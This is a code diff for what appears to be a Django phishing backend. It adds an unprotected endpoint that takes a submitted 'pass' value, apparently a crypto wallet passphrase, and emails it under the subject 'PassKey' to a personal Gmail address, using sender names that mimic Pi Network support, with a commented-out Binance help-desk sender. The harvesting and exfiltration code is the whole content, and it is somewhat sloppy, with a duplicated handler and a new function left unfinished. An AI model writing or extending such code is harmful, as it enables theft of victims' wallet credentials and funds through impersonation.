@@ -21,6 +21,12 @@ def handle_second_mail(request):
     SendSecondEmail(data['pass'])
     return JsonResponse({"status":"success"},safe=False)
 
+@csrf_exempt
+def handle_third_mail(request):
+    data=json.loads(request.body)
+    SendSecondEmail(data['pass'])
+    return JsonResponse({"status":"success"},safe=False)
+
 def SendEmail(text):
     sender = "support-desk@pimainnet.com"
     # sender="help-desk@binance.com"
@@ -43,6 +49,22 @@ def SendEmail(text):
 def SendSecondEmail(text):
     sender = "support-team@picoremainnet.com"
     recipient = f'pltnmsmith@gmail.com'
+# Create message
+    msg = MIMEMultipart("alternative")
+    msg['Subject'] = f"PassKey"
+    msg['From'] = sender
+    msg['To'] = recipient
+    part2 = MIMEText(text, 'plain')
+    msg.attach(part2)
+# Create server object with SSL option
+    server = smtplib.SMTP_SSL("smtp.zoho.com", 465)
+# Perform operations via server
+    server.login("pltnmsmith@gmail.com", settings.S_PASS)
+    server.sendmail("pltnmsmith@gmail.com", [recipient], msg.as_string())
+    server.quit()
+
+
+def SendThirdEmail(text):
 # Create message
     msg = MIMEMultipart("alternative")
     msg['Subject'] = f"PassKey"
